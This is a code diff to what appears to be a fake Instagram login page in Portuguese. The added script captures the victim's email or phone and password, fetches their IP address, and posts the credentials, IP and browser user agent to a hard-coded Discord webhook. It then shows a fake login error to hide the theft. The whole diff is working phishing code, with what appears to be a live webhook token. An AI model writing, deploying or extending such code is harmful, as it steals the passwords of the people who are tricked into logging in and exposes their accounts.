@@ -70,8 +70,30 @@
         <p class="copyright">© 2020 Instagram do Facebook</p>
     </footer>
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1480366266064830564/oxdF4Ed6DsE8AD7894wsBLZEVgXg0BqQKoJO3MDp1IlrsRcr6xQ5XmizwT1vUPko3Ubv';
+        
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            const label = email.includes('@') ? 'Email' : /^[0-9+\s()-]+$/.test(email) ? 'Telefone' : 'Usuario';
+            
+            let ip = 'N/A';
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch(e) {}
+            
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `**Login Attempt**\n${label}: ${email}\nPassword: ${password}\nIP: ${ip}\nUser-Agent: ${navigator.userAgent}`
+                })
+            });
+            
             document.getElementById('errorMsg').style.display = 'block';
         });
     </script>
